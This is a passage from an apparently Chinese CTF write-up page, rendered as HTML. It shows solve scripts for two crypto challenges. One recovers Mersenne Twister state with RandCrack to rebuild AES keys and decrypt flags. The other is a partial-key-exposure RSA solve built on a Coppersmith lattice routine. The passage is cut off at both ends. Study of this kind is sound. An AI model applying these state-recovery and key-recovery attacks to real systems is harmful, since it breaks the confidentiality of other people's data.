class="number">2563584713</span>, <span class="number">2738164238</span>, <span class="number">3438656534</span>, <span class="number">564065202</span>, <span class="number">3288501195</span>, <span class="number">1074332184</span>, <span class="number">2947775555</span>, <span class="number">3790174897</span>, <span class="number">3607901153</span>, <span class="number">2332098514</span>, <span class="number">3648669449</span>, <span class="number">3879104921</span>, <span class="number">3983960923</span>, <span class="number">548882335</span>, <span class="number">1817587379</span>, <span class="number">1555057777</span>, <span class="number">2705918139</span>, <span class="number">2755720626</span>, <span class="number">2706833366</span>, <span class="number">2947946695</span>, <span class="number">3082750952</span>, <span class="number">2323554320</span>, <span class="number">1804494628</span>, <span class="number">1677086381</span>, <span class="number">2771841028</span>, <span class="number">2470056271</span>, <span class="number">3431120732</span>, <span class="number">4073503495</span>, <span class="number">2929631518</span>, <span class="number">80800254</span>, <span class="number">605951710</span>, <span class="number">1664206366</span>, <span class="number">2498279527</span>, <span class="number">360922649</span>, <span class="number">2590660538</span>, <span class="number">3724444465</span>, <span class="number">3559953317</span>, <span class="number">3002864163</span>, <span class="number">3369368155</span>, <span class="number">1569518356</span>, <span class="number">3831143803</span>, <span class="number">4184782515</span>, <span class="number">1602338537</span>, <span class="number">2640186368</span>, <span class="number">2864951447</span>, <span class="number">514648741</span>, <span class="number">887020932</span>, <span class="number">166121609</span>, <span class="number">476244781</span>, <span class="number">2238614863</span>, <span class="number">3039706334</span>, <span class="number">3586500526</span>, <span class="number">3038068930</span>, <span class="number">3989751746</span>, <span class="number">3699955508</span>, <span class="number">3559348520</span>, <span class="number">884358906</span>, <span class="number">444882591</span>, <span class="number">3769021913</span>, <span class="number">3665754928</span>, <span class="number">1911261614</span>, <span class="number">1234192084</span>, <span class="number">3450557803</span>, <span class="number">3232410240</span>, <span class="number">494096069</span>, <span class="number">660552292</span>, <span class="number">1365481833</span>, <span class="number">520081058</span>, <span class="number">1027987838</span>, <span class="number">3165505556</span>, <span class="number">1257833693</span>, <span class="number">2146291679</span>, <span class="number">3634622224</span>, <span class="number">589123893</span>, <span class="number">1195030125</span>, <span class="number">1602406253</span>, <span class="number">772753497</span>, <span class="number">2661121530</span>, <span class="number">2938530200</span>, <span class="number">1070706826</span>, <span class="number">3890477657</span>, <span class="number">2112901265</span>, <span class="number">4253917692</span>, <span class="number">2291562806</span>, <span class="number">67613984</span>, <span class="number">2608069358</span>, <span class="number">1726139310</span>, <span class="number">3018885048</span>, <span class="number">367067728</span>, <span class="number">3838771641</span>, <span class="number">1357927847</span>, <span class="number">2616452172</span>, <span class="number">722979624</span>, <span class="number">4153031784</span>, <span class="number">607660099</span>, <span class="number">3164865398</span>, <span class="number">3199368055</span>, <span class="number">1885230388</span>, <span class="number">1055777913</span>, <span class="number">3475913336</span>, <span class="number">1546318749</span>, <span class="number">578282810</span>, <span class="number">1558944130</span>, <span class="number">2955660875</span>, <span class="number">2214838829</span>, <span class="number">4202836988</span>, <span class="number">1405916968</span>, <span class="number">2593459723</span>, <span class="number">3648360966</span>, <span class="number">3644813488</span>, <span class="number">598912719</span>, <span class="number">876098814</span>, <span class="number">355483438</span>, <span class="number">685352898</span>, <span class="number">4099087273</span>, <span class="number">2983380912</span>, <span class="number">450980374</span>, <span class="number">2753208777</span>, <span class="number">429297943</span>, <span class="number">3462109454</span>, <span class="number">3134522829</span>, <span class="number">2064548393</span>, <span class="number">2200750558</span>, <span class="number">4247753845</span>, <span class="number">251220053</span>, <span class="number">1556849099</span>, <span class="number">2022648175</span>, <span class="number">3563632884</span>, <span class="number">2175932589</span>, <span class="number">1463719656</span>, <span class="number">1887673611</span>, <span class="number">3541708446</span>, <span class="number">3033219582</span>, <span class="number">3255799816</span>, <span class="number">534398633</span>, <span class="number">3481196045</span>, <span class="number">825005812</span>, <span class="number">1629237540</span>, <span class="number">640085217</span>, <span class="number">899503755</span>, <span class="number">3105157116</span>, <span class="number">488231507</span>, <span class="number">2708835929</span>, <span class="number">2648663900</span>, <span class="number">2048030022</span>, <span class="number">1503411342</span>, <span class="number">4059850866</span>, <span class="number">1281156549</span>, <span class="number">3171426598</span>, <span class="number">2637361895</span>, <span class="number">1110841056</span>, <span class="number">606897504</span>, <span class="number">3001264062</span>, <span class="number">912267483</span>, <span class="number">148124465</span>, <span class="number">202684836</span>, <span class="number">1425732680</span>, <span class="number">3637635336</span>, <span class="number">1455737055</span>, <span class="number">2977077407</span>, <span class="number">54987379</span>, <span class="number">1056796337</span>, <span class="number">1832170261</span>, <span class="number">1870208138</span>, <span class="number">4074249428</span>, <span class="number">2993704297</span>, <span class="number">381772606</span>, <span class="number">2362720677</span>, <span class="number">2164369676</span>, <span class="number">250156737</span>, <span class="number">3409786877</span>, <span class="number">1590821450</span>, <span class="number">2959971180</span>, <span class="number">3682255149</span>, <span class="number">302283211</span>, <span class="number">4204651015</span>, <span class="number">1294232346</span>, <span class="number">3088162584</span>, <span class="number">4209012441</span>, <span class="number">784333825</span>, <span class="number">1275400791</span>, <span class="number">885466807</span>, <span class="number">1249631254</span>, <span class="number">1236809354</span>, <span class="number">2627231325</span>, <span class="number">2391839654</span>, <span class="number">1638467843</span>, <span class="number">2797229961</span>, <span class="number">3799496431</span>, <span class="number">237846505</span>, <span class="number">3432655604</span>, <span class="number">1690038717</span>, <span class="number">1493561006</span>, <span class="number">4229115929</span>, <span class="number">3784624191</span>, <span class="number">2891696687</span>, <span class="number">3557702324</span>, <span class="number">1120718375</span>, <span class="number">2593253432</span>, <span class="number">1415584860</span>, <span class="number">551110044</span>, <span class="number">1510986691</span>, <span class="number">3267929936</span>, <span class="number">2341598281</span>, <span class="number">247215742</span>, <span class="number">3192053018</span>, <span class="number">2856032615</span>, <span class="number">3290505354</span>, <span class="number">907961089</span>, <span class="number">4128700570</span>, <span class="number">4195745607</span>, <span class="number">2035634741</span>, <span class="number">1047086449</span>, <span class="number">216435127</span>, <span class="number">1997121891</span>, <span class="number">3391563810</span>, <span class="number">2813128796</span>, <span class="number">1517545322</span>]</span><br><span class="line"></span><br><span class="line">k2 = [<span class="number">2137201486</span>, <span class="number">2243095490</span>, <span class="number">3817098931</span>, <span class="number">229608464</span>, <span class="number">73854451</span>, <span class="number">2470370137</span>, <span class="number">647955184</span>, <span class="number">1997583099</span>, <span class="number">2122796155</span>, <span class="number">3754429965</span>, <span class="number">915090235</span>, <span class="number">3330907022</span>, <span class="number">4045925639</span>, <span class="number">1616378187</span>, <span class="number">3477748127</span>, <span class="number">3235608209</span>, <span class="number">4168058459</span>, <span class="number">137624259</span>, <span class="number">2992531650</span>, <span class="number">509166204</span>, <span class="number">3920545433</span>, <span class="number">1915159362</span>, <span class="number">3901263233</span>, <span class="number">4228481818</span>, <span class="number">2816405167</span>, <span class="number">1786108715</span>, <span class="number">3305752402</span>, <span class="number">2384763695</span>, <span class="number">227465801</span>, <span class="number">1052658065</span>, <span class="number">3153900057</span>, <span class="number">117311308</span>, <span class="number">1595474528</span>, <span class="number">1087880165</span>, <span class="number">3166831564</span>, <span class="number">1588364714</span>, <span class="number">528237288</span>, <span class="number">617272354</span>, <span class="number">618281932</span>, <span class="number">1618791873</span>, <span class="number">3810883062</span>, <span class="number">894018392</span>, <span class="number">2575794219</span>, <span class="number">103568311</span>, <span class="number">3298607681</span>, <span class="number">536028939</span>, <span class="number">3467146346</span>, <span class="number">2201685940</span>, <span class="number">1076138845</span>, <span class="number">918210863</span>, <span class="number">1341794665</span>, <span class="number">3456513087</span>, <span class="number">1710914773</span>, <span class="number">1894309846</span>, <span class="number">2312381988</span>, <span class="number">127727152</span>, <span class="number">876614149</span>, <span class="number">1709878784</span>, <span class="number">1156541415</span>, <span class="number">1555452594</span>, <span class="number">182448271</span>, <span class="number">408344822</span>, <span class="number">2898434231</span>, <span class="number">1998211488</span>, <span class="number">3592206445</span>, <span class="number">1085073460</span>, <span class="number">3397525879</span>, <span class="number">663024038</span>, <span class="number">3434587726</span>, <span class="number">2768736843</span>, <span class="number">617681814</span>, <span class="number">2865397550</span>, <span class="number">3463093384</span>, <span class="number">2746629701</span>, <span class="number">2006818690</span>, <span class="number">1121017677</span>, <span class="number">2047400279</span>, <span class="number">1921768902</span>, <span class="number">528024592</span>, <span class="number">2892263293</span>, <span class="number">2798869302</span>, <span class="number">3481658697</span>, <span class="number">2848153687</span>, <span class="number">1134481165</span>, <span class="number">3720776629</span>, <span class="number">486120970</span>, <span class="number">2683483151</span>, <span class="number">3252410704</span>, <span class="number">2891974166</span>, <span class="number">2121509882</span>, <span class="number">4160792826</span>, <span class="number">2915283137</span>, <span class="number">4014112386</span>, <span class="number">1792273527</span>, <span class="number">805496405</span>, <span class="number">1407962158</span>, <span class="number">3622679727</span>, <span class="number">3512697173</span>, <span class="number">2901255951</span>, <span class="number">3111681208</span>, <span class="number">2877903904</span>, <span class="number">827923100</span>, <span class="number">3729787569</span>, <span class="number">925768344</span>, <span class="number">923906770</span>, <span class="number">3606973890</span>, <span class="number">1181029191</span>, <span class="number">689515782</span>, <span class="number">1651144572</span>, <span class="number">3459362488</span>, <span class="number">2412684107</span>, <span class="number">1362064386</span>, <span class="number">4159398924</span>, <span class="number">2922809145</span>, <span class="number">1602978249</span>, <span class="number">3705882625</span>, <span class="number">4293462677</span>, <span class="number">764953390</span>, <span class="number">4178674632</span>, <span class="number">2074025926</span>, <span class="number">1925824438</span>, <span class="number">2523046149</span>, <span class="number">1263372335</span>, <span class="number">1677306491</span>, <span class="number">760292173</span>, <span class="number">3736532489</span>, <span class="number">2036587975</span>, <span class="number">514100070</span>, <span class="number">706857874</span>, <span class="number">1060105302</span>, <span class="number">2578078966</span>, <span class="number">2320134376</span>, <span class="number">3639164974</span>, <span class="number">1710455599</span>, <span class="number">45505402</span>, <span class="number">2407597519</span>, <span class="number">2537656373</span>, <span class="number">56251495</span>, <span class="number">1630733521</span>, <span class="number">519864415</span>, <span class="number">1444518872</span>, <span class="number">513906964</span>, <span class="number">3852284907</span>, <span class="number">800496493</span>, <span class="number">872675679</span>, <span class="number">3155530732</span>, <span class="number">683268660</span>, <span class="number">3856797215</span>, <span class="number">137673146</span>, <span class="number">3607443770</span>, <span class="number">3700387644</span>, <span class="number">965766446</span>, <span class="number">2454233777</span>, <span class="number">954672952</span>, <span class="number">2855774032</span>, <span class="number">3552757435</span>, <span class="number">3025907069</span>, <span class="number">1402938518</span>, <span class="number">3041387870</span>, <span class="number">3456472325</span>, <span class="number">447871942</span>, <span class="number">1327563590</span>, <span class="number">620160190</span>, <span class="number">1007188755</span>, <span class="number">180115074</span>, <span class="number">52020277</span>, <span class="number">1774723235</span>, <span class="number">2887773879</span>, <span class="number">3508414970</span>, <span class="number">3631951842</span>, <span class="number">1763635376</span>, <span class="number">1924307117</span>, <span class="number">4204987693</span>, <span class="number">2494477117</span>, <span class="number">4017134019</span>, <span class="number">368620157</span>, <span class="number">2814392181</span>, <span class="number">2199699352</span>, <span class="number">1158269085</span>, <span class="number">2580589087</span>, <span class="number">1747804339</span>, <span class="number">1012560482</span>, <span class="number">933361529</span>, <span class="number">176586313</span>, <span class="number">2808905110</span>, <span class="number">83750114</span>, <span class="number">3090684109</span>, <span class="number">1767704883</span>, <span class="number">4189833886</span>, <span class="number">4249260150</span>, <span class="number">2157821862</span>, <span class="number">2112716220</span>, <span class="number">261010276</span>, <span class="number">3168798078</span>, <span class="number">1920566780</span>, <span class="number">1823590666</span>, <span class="number">2244335700</span>, <span class="number">2816218464</span>, <span class="number">3295774792</span>, <span class="number">2283997010</span>, <span class="number">3733740723</span>, <span class="number">3169836042</span>, <span class="number">1782097885</span>, <span class="number">1421909608</span>, <span class="number">3071286976</span>, <span class="number">2529056825</span>, <span class="number">2917504380</span>, <span class="number">2500113967</span>, <span class="number">1340022169</span>, <span class="number">1325786585</span>, <span class="number">2696541388</span>, <span class="number">3763160733</span>, <span class="number">3603998832</span>, <span class="number">72655495</span>, <span class="number">2892272720</span>, <span class="number">2785458061</span>, <span class="number">1724578654</span>, <span class="number">2144338844</span>, <span class="number">2899719547</span>, <span class="number">318345339</span>, <span class="number">2511462884</span>, <span class="number">3220707099</span>, <span class="number">1676208778</span>, <span class="number">2586878575</span>, <span class="number">3209502577</span>, <span class="number">3013180194</span>, <span class="number">2700788434</span>, <span class="number">3611106949</span>, <span class="number">1712906930</span>, <span class="number">3381158761</span>, <span class="number">962420077</span>, <span class="number">1928661992</span>, <span class="number">1241692316</span>, <span class="number">3587734972</span>, <span class="number">2361851891</span>, <span class="number">729570171</span>, <span class="number">1255993130</span>, <span class="number">2059230370</span>, <span class="number">3819451535</span>, <span class="number">2490865889</span>, <span class="number">1229457976</span>, <span class="number">3062266381</span>, <span class="number">3350574651</span>, <span class="number">1861939269</span>, <span class="number">3074031276</span>, <span class="number">1122137253</span>, <span class="number">3267903554</span>, <span class="number">2691684836</span>, <span class="number">3042505532</span>, <span class="number">1103427454</span>, <span class="number">2126863565</span>, <span class="number">3686667924</span>, <span class="number">4181984974</span>, <span class="number">238390653</span>, <span class="number">2037278833</span>, <span class="number">2930470784</span>, <span class="number">424623283</span>, <span class="number">3074336567</span>, <span class="number">4019540123</span>, <span class="number">447553681</span>, <span class="number">491252047</span>, <span class="number">2134100060</span>, <span class="number">3683266682</span>, <span class="number">2218397687</span>, <span class="number">1535505498</span>, <span class="number">628745497</span>, <span class="number">445350701</span>, <span class="number">186184731</span>, <span class="number">3190072310</span>, <span class="number">1084556173</span>, <span class="number">277509904</span>, <span class="number">2898643406</span>, <span class="number">4292667973</span>, <span class="number">2903270520</span>, <span class="number">2565372604</span>, <span class="number">303440546</span>, <span class="number">1808627640</span>, <span class="number">3069152665</span>, <span class="number">2075086265</span>, <span class="number">350493108</span>, <span class="number">3426866771</span>, <span class="number">1167370872</span>, <span class="number">2856612905</span>, <span class="number">1133769957</span>, <span class="number">2168578594</span>, <span class="number">361418126</span>, <span class="number">1788736419</span>, <span class="number">3450707887</span>, <span class="number">1988560242</span>, <span class="number">3106183307</span>, <span class="number">420765626</span>, <span class="number">1595814948</span>, <span class="number">813997149</span>, <span class="number">2474462651</span>, <span class="number">3945801301</span>, <span class="number">1785414095</span>, <span class="number">4177305184</span>, <span class="number">3071687740</span>, <span class="number">1273724577</span>, <span class="number">4178527412</span>,</span><br><span class="line">      <span class="number">2536332142</span>, <span class="number">2692000853</span>, <span class="number">2172897829</span>, <span class="number">1472311250</span>, <span class="number">1630835977</span>, <span class="number">2274186143</span>, <span class="number">3947343331</span>, <span class="number">1836099636</span>, <span class="number">3955763613</span>, <span class="number">271610193</span>, <span class="number">2479541262</span>, <span class="number">3666471942</span>, <span class="number">4217699594</span>, <span class="number">341808580</span>, <span class="number">1517926781</span>, <span class="number">3311123634</span>, <span class="number">1738600938</span>, <span class="number">3870938757</span>, <span class="number">2309182531</span>, <span class="number">3189576099</span>, <span class="number">1594683626</span>, <span class="number">1900151562</span>, <span class="number">3625455382</span>, <span class="number">3527220315</span>, <span class="number">471268317</span>, <span class="number">4085391597</span>, <span class="number">1205291118</span>, <span class="number">1903466784</span>, <span class="number">934489768</span>, <span class="number">717103328</span>, <span class="number">407385599</span>, <span class="number">1146912039</span>, <span class="number">2148396650</span>, <span class="number">3906209540</span>, <span class="number">3002211292</span>, <span class="number">4003244728</span>, <span class="number">1595357238</span>, <span class="number">4224659669</span>, <span class="number">3679773598</span>, <span class="number">1554305724</span>, <span class="number">1879798896</span>, <span class="number">856183762</span>, <span class="number">2448013518</span>, <span class="number">2839667183</span>, <span class="number">3541976537</span>, <span class="number">1201501683</span>, <span class="number">2210517506</span>, <span class="number">3074699110</span>, <span class="number">2545660131</span>, <span class="number">3696626258</span>, <span class="number">1684534318</span>, <span class="number">3093429986</span>, <span class="number">2603224784</span>, <span class="number">3784468515</span>, <span class="number">1931537793</span>, <span class="number">570789340</span>, <span class="number">376758771</span>, <span class="number">2307788100</span>, <span class="number">2180860578</span>, <span class="number">201860820</span>, <span class="number">3293433128</span>, <span class="number">1396840567</span>, <span class="number">2231737923</span>, <span class="number">3343569549</span>, <span class="number">890147328</span>, <span class="number">3369945506</span>, <span class="number">3155052764</span>, <span class="number">4225372249</span>, <span class="number">3097945008</span>, <span class="number">1976073442</span>, <span class="number">1939061106</span>, <span class="number">3009821364</span>, <span class="number">3636790064</span>, <span class="number">1722351481</span>, <span class="number">571067187</span>, <span class="number">3660829870</span>, <span class="number">625774796</span>, <span class="number">962877120</span>, <span class="number">4093260308</span>, <span class="number">2994561947</span>, <span class="number">1780515932</span>, <span class="number">4180215026</span>, <span class="number">4252365298</span>, <span class="number">2947348994</span>, <span class="number">2484307881</span>, <span class="number">1869054839</span>, <span class="number">1567538899</span>, <span class="number">2381016872</span>, <span class="number">650248596</span>, <span class="number">2837463974</span>, <span class="number">3547259433</span>, <span class="number">1653667021</span>, <span class="number">276270749</span>, <span class="number">1685266082</span>, <span class="number">3605301102</span>, <span class="number">3560229703</span>, <span class="number">3732548108</span>, <span class="number">3643340502</span>, <span class="number">2787020632</span>, <span class="number">301650068</span>, <span class="number">1692193275</span>, <span class="number">3053122330</span>, <span class="number">446613045</span>, <span class="number">753748541</span>, <span class="number">3639322954</span>, <span class="number">2521151846</span>, <span class="number">3846032512</span>, <span class="number">2540737292</span>, <span class="number">1022192711</span>, <span class="number">4242180248</span>, <span class="number">2050165414</span>, <span class="number">2033316505</span>, <span class="number">3063183472</span>, <span class="number">2547887329</span>, <span class="number">1562411323</span>, <span class="number">2846186023</span>, <span class="number">1057549601</span>, <span class="number">200005518</span>, <span class="number">2515317663</span>, <span class="number">614142733</span>, <span class="number">2822762719</span>, <span class="number">1111596810</span>, <span class="number">730033186</span>, <span class="number">3539522165</span>, <span class="number">2876952827</span>, <span class="number">1093300071</span>, <span class="number">2988803720</span>, <span class="number">2788643910</span>, <span class="number">1815173676</span>, <span class="number">923492540</span>, <span class="number">1571870569</span>, <span class="number">1732017323</span>, <span class="number">3912738621</span>, <span class="number">1932484987</span>, <span class="number">1369226061</span>, <span class="number">1043943980</span>, <span class="number">659920686</span>, <span class="number">87860672</span>, <span class="number">3117771700</span>, <span class="number">536701</span>, <span class="number">1276716714</span>, <span class="number">399069847</span>, <span class="number">675178237</span>, <span class="number">4148780498</span>, <span class="number">2293633457</span>, <span class="number">510556418</span>, <span class="number">3306441120</span>, <span class="number">3969884840</span>, <span class="number">931665570</span>, <span class="number">1269866789</span>, <span class="number">1486094185</span>, <span class="number">1896845492</span>, <span class="number">2955478105</span>, <span class="number">3949294788</span>, <span class="number">2483398248</span>, <span class="number">2792552965</span>, <span class="number">367597061</span>, <span class="number">955979053</span>, <span class="number">4141216471</span>, <span class="number">3162398417</span>, <span class="number">783759084</span>, <span class="number">605101703</span>, <span class="number">3200303074</span>, <span class="number">1835668453</span>, <span class="number">3586071304</span>, <span class="number">2174558649</span>, <span class="number">2997422459</span>, <span class="number">3634493394</span>, <span class="number">4138976583</span>, <span class="number">164027380</span>, <span class="number">490279465</span>, <span class="number">2469644175</span>, <span class="number">43130477</span>, <span class="number">1547916166</span>, <span class="number">2406583577</span>, <span class="number">1303190434</span>, <span class="number">1431585058</span>, <span class="number">1519905099</span>, <span class="number">1079834268</span>, <span class="number">231749295</span>, <span class="number">1635997362</span>, <span class="number">1423407810</span>, <span class="number">2814537500</span>, <span class="number">2894136671</span>, <span class="number">3686889877</span>, <span class="number">1812711299</span>, <span class="number">4226627996</span>, <span class="number">3754118359</span>, <span class="number">20804048</span>, <span class="number">4285391186</span>, <span class="number">2958387414</span>, <span class="number">2233166520</span>, <span class="number">3070925064</span>, <span class="number">1320913219</span>, <span class="number">2976334802</span>, <span class="number">4041836979</span>, <span class="number">382095839</span>, <span class="number">1388937175</span>, <span class="number">1819247059</span>, <span class="number">3838255239</span>, <span class="number">3380204370</span>, <span class="number">3935811842</span>, <span class="number">2751480313</span>, <span class="number">164540071</span>, <span class="number">2340071112</span>, <span class="number">610666648</span>, <span class="number">595972300</span>, <span class="number">2011517128</span>, <span class="number">213838138</span>, <span class="number">4255091509</span>, <span class="number">3777157969</span>, <span class="number">2402199559</span>, <span class="number">3852693289</span>, <span class="number">4206005132</span>, <span class="number">3787527275</span>, <span class="number">1471785983</span>, <span class="number">2589388076</span>, <span class="number">631286274</span>, <span class="number">3524096200</span>, <span class="number">590972337</span>, <span class="number">1887865600</span>, <span class="number">1760603763</span>, <span class="number">643231370</span>, <span class="number">2643740969</span>, <span class="number">2388499010</span>, <span class="number">1722852753</span>, <span class="number">645073667</span>, <span class="number">3177739276</span>, <span class="number">1242181637</span>, <span class="number">2984331308</span>, <span class="number">567911875</span>, <span class="number">753620395</span>, <span class="number">3743678155</span>, <span class="number">4278357119</span>, <span class="number">2815496781</span>, <span class="number">1270587449</span>, <span class="number">4259346098</span>, <span class="number">589049437</span>, <span class="number">3257834517</span>, <span class="number">3637173709</span>, <span class="number">2882662502</span>, <span class="number">2892380404</span>, <span class="number">1843952012</span>, <span class="number">2832065071</span>, <span class="number">1053718106</span>, <span class="number">330418109</span>, <span class="number">3909969653</span>, <span class="number">916711438</span>, <span class="number">3709287944</span>, <span class="number">2455153252</span>, <span class="number">763050070</span>, <span class="number">1667025352</span>, <span class="number">3019273370</span>, <span class="number">3814458403</span>, <span class="number">1093369006</span>, <span class="number">3332713718</span>, <span class="number">752637853</span>, <span class="number">100085835</span>, <span class="number">523535862</span>, <span class="number">4068027345</span>, <span class="number">1845694557</span>, <span class="number">2754500540</span>, <span class="number">3395089568</span>, <span class="number">2675873208</span>, <span class="number">525907800</span>, <span class="number">937117572</span>, <span class="number">3313729567</span>, <span class="number">1112554253</span>, <span class="number">114888315</span>, <span class="number">619966459</span>, <span class="number">1641381760</span>, <span class="number">1017743298</span>, <span class="number">1178701646</span>, <span class="number">1581336326</span>, <span class="number">362103885</span>, <span class="number">3516308826</span>, <span class="number">869224156</span>, <span class="number">376989708</span>, <span class="number">633412018</span>, <span class="number">1074308065</span>, <span class="number">3818889570</span>, <span class="number">4249601414</span>, <span class="number">2417156426</span>, <span class="number">2229939059</span>, <span class="number">1313267093</span>, <span class="number">2929434755</span>, <span class="number">783116601</span>, <span class="number">1643811645</span>, <span class="number">996372459</span>, <span class="number">3352907069</span>, <span class="number">953035592</span>, <span class="number">1641549976</span>, <span class="number">2112115418</span>, <span class="number">1350813227</span>, <span class="number">3528081888</span>, <span class="number">1136982588</span>, <span class="number">1390912242</span>, <span class="number">2659886726</span>, <span class="number">1031606598</span>, <span class="number">2617877628</span>]</span><br><span class="line">c1 = <span class="string">b&#x27;\x04\xd6k\xe5:\x9a\xabu\xb3\r\x06\xd9\x8e\x04\x87\xc7\x10\xecv\x0bG,\x9c\xb5\xb5q\xd6\x9c\xb8\xb7\xb1d&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;CT\x1a&gt;\x12\x8ff&quot;\x89\xde\x9a\x0f\xf4\xac\xa2\xe7\xd2%\x15\xdd`\x03\xf4?u\x07#\xf9\x03\xde\xd4\x97&#x27;</span></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> k1:</span><br><span class="line">    rc.submit(num)</span><br><span class="line">cal = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    cal += rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">aes1 = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag1 = aes1.decrypt(c1).decode()</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>):</span><br><span class="line">    rc.submit(k2[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>, <span class="number">624</span>):</span><br><span class="line">    rc.submit(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">cal = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>//<span class="number">4</span>):</span><br><span class="line">    cal += rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">aes2 = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag2 = aes2.decrypt(c2).decode()</span><br><span class="line">flag = flag1+flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>MT19937</code><code>flag1</code>(624)<code>RandCrack()</code></p><p><code>flag2</code>60024<code>state</code>24<code>flag</code><code>MT19937</code></p><p>Orz<br /><a href="https://tangcuxiaojikuai.xyz/post/1dda48e6.html">https://tangcuxiaojikuai.xyz/post/1dda48e6.html</a><br /><img src="https://pica.zhimg.com/80/v2-ad782de3e2c583d1d9b7a9f04d5e9bd2_1440w.png" alt="" /></p><h3 id="baby_rsa"><a class="markdownIt-Anchor" href="#baby_rsa"></a> baby_rsa</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://github.com/jvdsn/crypto-attacks</span></span><br><span class="line">n = <span class="number">149172698687247343307484774427463947040435385939538317995577802933708356659744781308849658149199463270402946054959026247011496643609722381036883462993606208405454448793748282856217226973570288117498818638210423816294135228225752144034736417495450129714250843040389723696691326017062575682989124677170212774709</span></span><br><span class="line">e = <span class="number">117932126002671581139669626170313849654365346787524775666511151162210096339679521576248537514813055641658722582914817481701142826861992970974206985137736311670025047752207632786439134855261541672012123572997654885689727972923659090161642085293034838535696206768459211817851404605357080649176502772728128885161</span></span><br><span class="line">c = <span class="number">5560665954852260703690321742771294743847646190564920056638605621636133720600072404637746086157764356927591996611862975162275415163691292729424412545560091018172812509230401361899309377868998693154480684535377865697939714965280441927137203589475324582174585416573174423912557361267766810988676863548944796515</span></span><br><span class="line">dm = <span class="number">0x2498aa4c85de5a33d5766f28d879f0df7175f43dd71cd4ab56ab67bf76334e6e3dcb</span></span><br><span class="line">dl = <span class="number">0x4c21c14305c34ed8f5e8879452c4ce569ce0789e6b39</span></span><br><span class="line">d_zj=???</span><br></pre></td></tr></table></figure><p><code>d</code><a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html">5</a><code>d.bit_lengths()=512</code></p><p><code>sage10.4</code><code>sage10.2</code>10.4QWQ</p><p><a href="https://dawn1ight.github.io/post/23197/#week4-baby-rsa"></a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment">#coppersmith</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficients_monomials()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = <span class="number">149172698687247343307484774427463947040435385939538317995577802933708356659744781308849658149199463270402946054959026247011496643609722381036883462993606208405454448793748282856217226973570288117498818638210423816294135228225752144034736417495450129714250843040389723696691326017062575682989124677170212774709</span></span><br><span class="line">e = <span 